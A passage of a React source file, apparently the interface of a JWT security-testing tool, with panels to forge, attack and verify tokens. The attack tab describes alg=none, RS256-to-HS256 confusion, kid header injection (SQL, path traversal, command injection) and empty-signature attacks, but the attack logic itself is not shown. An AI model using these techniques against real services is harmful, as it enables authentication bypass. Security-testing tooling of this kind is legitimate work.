                    borderBottom={`1px solid ${CARD_BD}`}>
                    <Box w="3px" h="13px" borderRadius="full" bg={ACCENT} />
                    <Text fontSize="10px" fontWeight="bold" color={MUTED}
                      textTransform="uppercase" letterSpacing="wider">
                      Forge Token
                    </Text>
                  </Flex>
                  <Box p={4}>
                    <Flex gap={3} mb={3}>
                      <Box flex={1}>
                        <Text fontSize="9px" fontWeight="bold" color={MUTED} mb={1}
                          textTransform="uppercase" letterSpacing="wider">Header (JSON)</Text>
                        <Textarea
                          fontSize="11px" fontFamily="mono"
                          minH="120px" resize="vertical"
                          bg="rgba(6,8,12,0.6)" border={`1px solid ${CARD_BD}`}
                          color="#a8d8c8"
                          _focus={{ borderColor: A_B, boxShadow: `0 0 0 1px ${A_B}`, outline: 'none' }}
                          value={forgeHeader} onChange={e => setForgeHeader(e.target.value)}
                          placeholder='{ "alg": "HS256", "typ": "JWT" }' />
                      </Box>
                      <Box flex={1}>
                        <Text fontSize="9px" fontWeight="bold" color={MUTED} mb={1}
                          textTransform="uppercase" letterSpacing="wider">Payload (JSON)</Text>
                        <Textarea
                          fontSize="11px" fontFamily="mono"
                          minH="120px" resize="vertical"
                          bg="rgba(6,8,12,0.6)" border={`1px solid ${CARD_BD}`}
                          color="#a8d8c8"
                          _focus={{ borderColor: A_B, boxShadow: `0 0 0 1px ${A_B}`, outline: 'none' }}
                          value={forgePayload} onChange={e => setForgePayload(e.target.value)}
                          placeholder='{ "sub": "admin", "exp": 9999999999 }' />
                      </Box>
                    </Flex>

                    <Flex gap={3} align="flex-end" mb={3} flexWrap="wrap">
                      <Box w="120px">
                        <Text fontSize="9px" fontWeight="bold" color={MUTED} mb={1}
                          textTransform="uppercase" letterSpacing="wider">Algorithm</Text>
                        <Select h="36px" fontSize="sm" borderRadius="8px"
                          bg="rgba(255,255,255,0.03)" borderColor={CARD_BD}
                          color="var(--dash-text-primary)" focusBorderColor={A_B}
                          sx={{ '& option': { background: '#14181f' } }}
                          value={forgeAlg} onChange={e => setForgeAlg(e.target.value)}>
                          {['HS256', 'HS384', 'HS512', 'none'].map(a => (
                            <option key={a} value={a}>{a}</option>
                          ))}
                        </Select>
                      </Box>
                      <Box flex={1} minW="200px">
                        <Text fontSize="9px" fontWeight="bold" color={MUTED} mb={1}
                          textTransform="uppercase" letterSpacing="wider">
                          Secret {forgeAlg === 'none' && <Text as="span" color={MUTED}>· not used</Text>}
                        </Text>
                        <Input h="36px" fontSize="sm" fontFamily="mono" borderRadius="8px"
                          bg="rgba(255,255,255,0.03)" border={`1px solid ${CARD_BD}`}
                          color="var(--dash-text-primary)"
                          _placeholder={{ color: MUTED, fontFamily: 'sans-serif', fontSize: '12px' }}
                          _focus={{ borderColor: A_B, boxShadow: `0 0 0 1px ${A_B}`, outline: 'none' }}
                          placeholder="HMAC secret · paste cracked key here"
                          isDisabled={forgeAlg === 'none'}
                          value={forgeSecret} onChange={e => setForgeSecret(e.target.value)} />
                      </Box>
                      <Button size="sm" h="36px" px={5} borderRadius="8px" fontWeight="semibold"
                        bg={`${ACCENT}15`} border={`1px solid ${A_B}`}
                        color={ACCENT} _hover={{ bg: `${ACCENT}25` }}
                        leftIcon={forging ? <Spinner size="xs" /> : <CheckIcon boxSize={3} />}
                        onClick={forge} isDisabled={forging}>
                        Forge Token
                      </Button>
                    </Flex>

                    {forgedToken && (
                      <Box mt={2} p={3} borderRadius="9px"
                        bg="rgba(6,8,12,0.6)" border={`1px solid ${A_B}`}>
                        <Flex align="center" justify="space-between" mb={2}>
                          <Text fontSize="9px" fontWeight="bold" color={ACCENT}
                            textTransform="uppercase" letterSpacing="wider">
                            Forged Token
                          </Text>
                          <Flex gap={1}>
                            <Button size="xs" variant="ghost" color={MUTED} fontSize="10px"
                              _hover={{ color: ACCENT }}
                              onClick={() => { setRawToken(forgedToken); setTab('decode'); }}>
                              Use as input
                            </Button>
                            <CopyBtn text={forgedToken} />
                          </Flex>
                        </Flex>
                        <Text fontSize="11px" fontFamily="mono" color="#a8d8c8"
                          wordBreak="break-all">
                          {forgedToken}
                        </Text>
                      </Box>
                    )}
                  </Box>
                </Box>
              </MotionBox>
            )}

            {/* ── ATTACK TAB ─────────────────────────────────────────── */}
            {tab === 'attack' && (
              <MotionBox key="attack"
                initial={{ opacity: 0, y: 6 }} animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0 }} transition={{ duration: 0.2 }}>
                <Flex direction="column" gap={3}>

                  {!decoded && (
                    <Box borderRadius="11px" bg={CARD_BG} border={`1px dashed ${CARD_BD}`}
                      py={6} textAlign="center">
                      <Text fontSize="12px" color={MUTED}>
                        Paste a token in the input above to enable attacks
                      </Text>
                    </Box>
                  )}

                  {decoded && (
                    <>
                      {/* alg=none */}
                      <Box borderRadius="11px" bg={CARD_BG} border={`1px solid ${CARD_BD}`}
                        overflow="hidden" pos="relative">
                        <Box pos="absolute" top={0} left={0} right={0} h="2px"
                          style={{ background: `linear-gradient(to right, transparent, ${RED}90, transparent)` }} />
                        <Flex align="center" justify="space-between" gap={3} p={4}>
                          <Box flex={1}>
                            <Flex align="center" gap={2} mb={1}>
                              <Text fontSize="11px" fontWeight="bold" color="var(--dash-text-primary)">
                                Algorithm Confusion · alg=none
                              </Text>
                              <Box px="5px" py="1px" borderRadius="3px"
                                bg={`${RED}12`} border={`1px solid ${RED}30`}>
                                <Text fontSize="8px" fontWeight="black" color={RED}
                                  textTransform="uppercase">critical</Text>
                              </Box>
                            </Flex>
                            <Text fontSize="11px" color="var(--dash-text-secondary)">
                              Set the <Text as="span" fontFamily="mono" color={ACCENT}>alg</Text> header to <Text as="span" fontFamily="mono" color={RED}>none</Text> and strip the signature. Older libs may accept this as valid.
                            </Text>
                          </Box>
                          <Button size="sm" h="32px" px={4} borderRadius="7px" fontWeight="semibold" fontSize="11px"
                            bg={`${ACCENT}15`} border={`1px solid ${A_B}`}
                            color={ACCENT} _hover={{ bg: `${ACCENT}25` }}
                            onClick={attackAlgNone}>Run</Button>
                        </Flex>
                      </Box>

                      {/* alg confusion RS→HS */}
                      <Box borderRadius="11px" bg={CARD_BG} border={`1px solid ${CARD_BD}`}
                        overflow="hidden" pos="relative">
                        <Box pos="absolute" top={0} left={0} right={0} h="2px"
                          style={{ background: `linear-gradient(to right, transparent, ${ORANGE}90, transparent)` }} />
                        <Box p={4}>
                          <Flex align="center" gap={2} mb={1}>
                            <Text fontSize="11px" fontWeight="bold" color="var(--dash-text-primary)">
                              Algorithm Confusion · RS256 → HS256
                            </Text>
                            <Box px="5px" py="1px" borderRadius="3px"
                              bg={`${ORANGE}12`} border={`1px solid ${ORANGE}30`}>
                              <Text fontSize="8px" fontWeight="black" color={ORANGE}
                                textTransform="uppercase">high</Text>
                            </Box>
                          </Flex>
                          <Text fontSize="11px" color="var(--dash-text-secondary)" mb={3}>
                            Sign the token with HS256, using the server's RSA <Text as="span" fontFamily="mono" color={ACCENT}>public key</Text> bytes as the HMAC secret. If the server uses an algorithm-agnostic verify, it'll trust this token.
                          </Text>
                          <Textarea
                            fontSize="10px" fontFamily="mono"
                            minH="100px" resize="vertical" mb={2}
                            bg="rgba(6,8,12,0.6)" border={`1px solid ${CARD_BD}`}
                            color="#a8d8c8"
                            _placeholder={{ color: MUTED, fontFamily: 'sans-serif' }}
                            _focus={{ borderColor: A_B, boxShadow: `0 0 0 1px ${A_B}`, outline: 'none' }}
                            placeholder={'-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkq...\n-----END PUBLIC KEY-----'}
                            value={attackPubKey} onChange={e => setAttackPubKey(e.target.value)} />
                          <Button size="sm" h="32px" px={4} borderRadius="7px" fontWeight="semibold" fontSize="11px"
                            bg={`${ACCENT}15`} border={`1px solid ${A_B}`}
                            color={ACCENT} _hover={{ bg: `${ACCENT}25` }}
                            onClick={attackAlgConfusion}>Run</Button>
                        </Box>
                      </Box>

                      {/* KID injection */}
                      <Box borderRadius="11px" bg={CARD_BG} border={`1px solid ${CARD_BD}`}
                        overflow="hidden" pos="relative">
                        <Box pos="absolute" top={0} left={0} right={0} h="2px"
                          style={{ background: `linear-gradient(to right, transparent, ${GOLD}90, transparent)` }} />
                        <Box p={4}>
                          <Flex align="center" gap={2} mb={1}>
                            <Text fontSize="11px" fontWeight="bold" color="var(--dash-text-primary)">
                              KID Header Injection
                            </Text>
                            <Box px="5px" py="1px" borderRadius="3px"
                              bg={`${GOLD}12`} border={`1px solid ${GOLD}30`}>
                              <Text fontSize="8px" fontWeight="black" color={GOLD}
                                textTransform="uppercase">medium</Text>
                            </Box>
                          </Flex>
                          <Text fontSize="11px" color="var(--dash-text-secondary)" mb={3}>
                            Inject malicious values into the <Text as="span" fontFamily="mono" color={ACCENT}>kid</Text> header to abuse SQL queries, file path lookups, or command shells.
                          </Text>
                          <Flex gap={2} flexWrap="wrap">
                            <Button size="xs" h="28px" px={3} borderRadius="6px" fontSize="10px"
                              bg="rgba(255,255,255,0.04)" border={`1px solid ${CARD_BD}`}
                              color="var(--dash-text-secondary)" _hover={{ borderColor: A_B, color: ACCENT }}
                              onClick={() => attackKidInjection('sqli')}>
                              SQLi · UNION SELECT
                            </Button>
                            <Button size="xs" h="28px" px={3} borderRadius="6px" fontSize="10px"
                              bg="rgba(255,255,255,0.04)" border={`1px solid ${CARD_BD}`}
                              color="var(--dash-text-secondary)" _hover={{ borderColor: A_B, color: ACCENT }}
                              onClick={() => attackKidInjection('traversal')}>
                              Path Traversal · /dev/null
                            </Button>
                            <Button size="xs" h="28px" px={3} borderRadius="6px" fontSize="10px"
                              bg="rgba(255,255,255,0.04)" border={`1px solid ${CARD_BD}`}
                              color="var(--dash-text-secondary)" _hover={{ borderColor: A_B, color: ACCENT }}
                              onClick={() => attackKidInjection('cmd')}>
                              Command Injection
                            </Button>
                            <Button size="xs" h="28px" px={3} borderRadius="6px" fontSize="10px"
                              bg="rgba(255,255,255,0.04)" border={`1px solid ${CARD_BD}`}
                              color="var(--dash-text-secondary)" _hover={{ borderColor: A_B, color: ACCENT }}
                              onClick={() => attackKidInjection('empty')}>
                              Empty kid
                            </Button>
                          </Flex>
                        </Box>
                      </Box>

                      {/* Empty signature */}
                      <Box borderRadius="11px" bg={CARD_BG} border={`1px solid ${CARD_BD}`}
                        overflow="hidden" pos="relative">
                        <Box pos="absolute" top={0} left={0} right={0} h="2px"
                          style={{ background: `linear-gradient(to right, transparent, ${BLUE}90, transparent)` }} />
                        <Flex align="center" justify="space-between" gap={3} p={4}>
                          <Box flex={1}>
                            <Flex align="center" gap={2} mb={1}>
                              <Text fontSize="11px" fontWeight="bold" color="var(--dash-text-primary)">
                                Empty Signature
                              </Text>
                              <Box px="5px" py="1px" borderRadius="3px"
                                bg={`${BLUE}12`} border={`1px solid ${BLUE}30`}>
                                <Text fontSize="8px" fontWeight="black" color={BLUE}
                                  textTransform="uppercase">low</Text>
                              </Box>
                            </Flex>
                            <Text fontSize="11px" color="var(--dash-text-secondary)">
                              Keep alg, send token with empty signature segment (<Text as="span" fontFamily="mono" color={ACCENT}>header.payload.</Text>). Some libs treat empty as zero-length-valid.
                            </Text>
                          </Box>
                          <Button size="sm" h="32px" px={4} borderRadius="7px" fontWeight="semibold" fontSize="11px"
                            bg={`${ACCENT}15`} border={`1px solid ${A_B}`}
                            color={ACCENT} _hover={{ bg: `${ACCENT}25` }}
                            onClick={attackEmptySig}>Run</Button>
                        </Flex>
                      </Box>

                      {/* Output */}
                      {attackOutput && (
                        <Box borderRadius="11px" bg="rgba(6,8,12,0.6)"
                          border={`1px solid ${A_B}`} overflow="hidden">
                          <Flex align="center" justify="space-between" px={4} py={2.5}
                            borderBottom={`1px solid ${A_B}`}>
                            <Text fontSize="9px" fontWeight="black" color={ACCENT}
                              textTransform="uppercase" letterSpacing="wider">
                              Attack Output
                            </Text>
                            <Flex gap={1}>
                              <Button size="xs" variant="ghost" color={MUTED} fontSize="10px"
                                _hover={{ color: ACCENT }} onClick={useAttackOutput}>
                                Use as input
                              </Button>
                              <CopyBtn text={attackOutput} />
                            </Flex>
                          </Flex>
                          <Box p={4}>
                            <Text fontSize="11px" fontFamily="mono" color="#a8d8c8"
                              wordBreak="break-all">
                              {attackOutput}
                            </Text>
                          </Box>
                        </Box>
                      )}
                    </>
                  )}
                </Flex>
              </MotionBox>
            )}

            {/* ── VALIDATE TAB ───────────────────────────────────────── */}
            {tab === 'validate' && (
              <MotionBox key="validate"
                initial={{ opacity: 0, y: 6 }} animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0 }} transition={{ duration: 0.2 }}>
                <Box borderRadius="14px" bg={CARD_BG} border={`1px solid ${CARD_BD}`}
                  overflow="hidden" pos="relative">
                  <Box pos="absolute" top={0} left={0} right={0} h="2px"
                    style={{ background: `linear-gradient(to right, transparent, ${ACCENT}70, transparent)` }} />
                  <Flex align="center" gap={2} px={5} py={3}
                    borderBottom={`1px solid ${CARD_BD}`}>
                    <Box w="3px" h="13px" borderRadius="full" bg={ACCENT} />
                    <Text fontSize="10px" fontWeight="bold" color={MUTED}
                      textTransform="uppercase" letterSpacing="wider">Verify Signature</Text>
                  </Flex>
                  <Box p={4}>
                    <Text fontSize="9px" fontWeight="bold" color={MUTED} mb={1}
                      textTransform="uppercase" letterSpacing="wider">
                      Secret (HS*) or Public Key in PEM (RS*)
                    </Text>
                    <Textarea fontSize="11px" fontFamily="mono" minH="100px" resize="vertical"
                      bg="rgba(6,8,12,0.6)" border={`1px solid ${CARD_BD}`}
                      color="#a8d8c8"
                      _placeholder={{ color: MUTED, fontFamily: 'sans-serif' }}
                      _focus={{ borderColor: A_B, boxShadow: `0 0 0 1px ${A_B}`, outline: 'none' }}
                      placeholder={decoded?.header?.alg && /^RS/i.test(decoded.header.alg)
                        ? '-----BEGIN PUBLIC KEY-----\nMIIBI...\n-----END PUBLIC KEY-----'
                        : 'your-256-bit-secret'}
                      value={verifySecret} onChange={e => setVerifySecret(e.target.value)} />

                    <Flex align="center" justify="space-between" mt={3}>
                      <Text fontSize="11px" color={MUTED}>
                        {decoded?.header?.alg
                          ? `Algorithm detected: ${decoded.header.alg}`
                          : 'Decode a token first'}
                      </Text>
                      <Button size="sm" h="34px" px={5} borderRadius="8px" fontWeight="semibold"
                        bg={`${ACCENT}15`} border={`1px solid ${A_B}`}
                        color={ACCENT} _hover={{ bg: `${ACCENT}25` }}
                        leftIcon={verifying ? <Spinner size="xs" /> : <CheckIcon boxSize={3} />}
                        onClick={verify} isDisabled={verifying || !decoded}>
                        Verify
                      </Button>
                    </Flex>

                    {verifyResult && (
                      <MotionBox initial={{ opacity: 0, y: 6 }} animate={{ opacity: 1, y: 0 }}
                        mt={3} p={3} borderRadius="9px"
                        bg={verifyResult === 'valid' ? 'rgba(52,211,153,0.1)' :
                            verifyResult === 'invalid' ? 'rgba(252,129,129,0.1)' :
                            'rgba(255,255,255,0.04)'}
                        border={`1px solid ${
                          verifyResult === 'valid'   ? GREEN + '40' :
                          verifyResult === 'invalid' ? RED + '40'   : CARD_BD
                        }`}>
                        <Flex align="center" gap={2}>
                          {verifyResult === 'valid' && <CheckIcon color={GREEN} />}
                          {verifyResult === 'invalid' && <WarningTwoIcon color={RED} />}
                          {verifyResult === 'unsupported' && <WarningTwoIcon color={MUTED} />}
                          <Text fontSize="12px" fontWeight="bold"
                            color={verifyResult === 'valid' ? GREEN :
                                   verifyResult === 'invalid' ? RED : MUTED}>
                            {verifyResult === 'valid'       ? 'Signature is VALID'
                            : verifyResult === 'invalid'    ? 'Signature is INVALID'
                            :                                  `${decoded?.header?.alg || 'This algorithm'} verification not supported in-browser`}
                          </Text>
                        </Flex>
                      </MotionBox>
                    )}
                  </Box>
                </Box>
              </MotionBox>
            )}

          </AnimatePresence>
        </Flex>

        {/* ── Right column: history + reference ───────────────────────────── */}
        <Box w="260px" flexShrink={0} borderLeft={`1px solid ${CARD_BD}`} pl={5}>

          <Flex align="center" justify="space-between" mb={4}>
            <Flex align="center" gap={2}>
              <Box w="3px" h="13px" borderRadius="full" bg={ACCENT} />
              <Text fontSize="10px" color={MUTED} textTransform="uppercase"
                letterSpacing="widest" fontWeight="bold">History</Text>
            </Flex>
            {history.length > 0 && (
              <Box px={2} py="1px" borderRadius="full" bg={A_S} border={`1px solid ${A_B}`}>
                <Text fontSize="10px" color={ACCENT} fontWeight="bold">{history.length}</Text>
              </Box>
            )}
            <Tooltip label="Refresh" hasArrow fontSize="10px">
              <IconButton size="xs" variant="ghost" icon={<RepeatIcon />}
                color={MUTED} _hover={{ color: ACCENT }}
                onClick={fetchHistory} aria-label="refresh" />
            </Tooltip>
          </Flex>

          <Flex direction="column" gap={1}>
            {history.length === 0 ? (
              <Flex align="center" justify="center" py={10}>
                <Text fontSize="11px" color={MUTED} opacity={0.4}>
                  No saved tokens yet
                </Text>
              </Flex>
            ) : (
              history.map(h => (
                <MotionBox key={h._id}
                  initial={{ opacity: 0, x: 6 }} animate={{ opacity: 1, x: 0 }}
                  transition={{ duration: 0.15 }}
                  px={3} py="9px" borderRadius="9px" cursor="pointer"
                  border="1px solid transparent"
                  _hover={{ bg: 'rgba(255,255,255,0.04)', borderColor: A_B }}
                  onClick={() => loadHistory(h)}>
                  <Flex align="center" justify="space-between" gap={2} mb={1}>
                    <Box px="6px" py="1px" borderRadius="3px"
                      bg={`${algBadgeColor(h.algorithm)}12`}
                      border={`1px solid ${algBadgeColor(h.algorithm)}30`}>
                      <Text fontSize="9px" fontWeight="black" fontFamily="mono"
                        color={algBadgeColor(h.algorithm)}>
                        {h.algorithm || 'unknown'}
                      </Text>
                    </Box>
                    {h.warnings?.length > 0 && (
                      <Box px="5px" py="1px" borderRadius="3px"
                        bg="rgba(252,129,129,0.1)" border={`1px solid ${RED}28`}>
                        <Text fontSize="9px" fontWeight="bold" color={RED}>
                          {h.warnings.length} ⚠
                        </Text>
                      </Box>
                    )}
                    <Box flex={1} />
                    <IconButton size="xs" variant="ghost" icon={<DeleteIcon boxSize={2.5} />}
                      color={MUTED} _hover={{ color: RED }}
                      onClick={(e) => { e.stopPropagation(); deleteHistory(h._id); }}
                      aria-label="delete" />
                  </Flex>
                  <Text fontSize="10px" fontFamily="mono"
                    color="var(--dash-text-secondary)" noOfLines={1}>
                    {(h.payload?.sub || h.payload?.email || h.payload?.iss || '—')}
                  </Text>
                  <Flex align="center" gap={1.5} mt={0.5}>
                    <TimeIcon boxSize={2} color={MUTED} />
                    <Text fontSize="9px" color={MUTED}>
                      {fmtRelative(h.createdAt)}
                    </Text>
                    {h.createdByOperatorName && (
                      <>
                        <Box w="2px" h="2px" borderRadius="full" bg={MUTED} />
                        <Text fontSize="9px" color={MUTED} noOfLines={1}>
                          {h.createdByOperatorName}
                        </Text>
                      </>
                    )}
                  </Flex>
                </MotionBox>
              ))
            )}
          </Flex>

          {/* Quick reference */}
          <Box mt={5} pt={4} borderTop={`1px solid ${CARD_BD}`}>
            <Text fontSize="9px" color={MUTED} textTransform="uppercase"
              letterSpacing="wider" fontWeight="bold" mb={2}>JWT Cheat-Sheet</Text>
            <Flex direction="column" gap={1.5}>
              <Box>
                <Text fontSize="10px" color={ACCENT} fontFamily="mono" fontWeight="bold">header.payload.signature</Text>
                <Text fontSize="9px" color={MUTED} mt={0.5}>3 base64url segments joined by dots</Text>
              </Box>
              <Box mt={2}>
                <Text fontSize="9px" color={MUTED} fontWeight="bold" mb={1}>Common Claims</Text>
                {[['exp', 'expiration'], ['iat', 'issued at'], ['sub', 'subject'],
                  ['iss', 'issuer'], ['aud', 'audience'], ['kid', 'key id']].map(([k, v]) => (
                  <Flex key={k} align="center" gap={2} px={1} py="2px">
                    <Text fontSize="9px" fontFamily="mono" color={ACCENT} w="32px">{k}</Text>
                    <Text fontSize="9px" color={MUTED}>{v}</Text>
                  </Flex>
                ))}
              </Box>
            </Flex>
          </Box>
        </Box>
      </Flex>
    </Box>
  );
};

export default JWTStudioView;
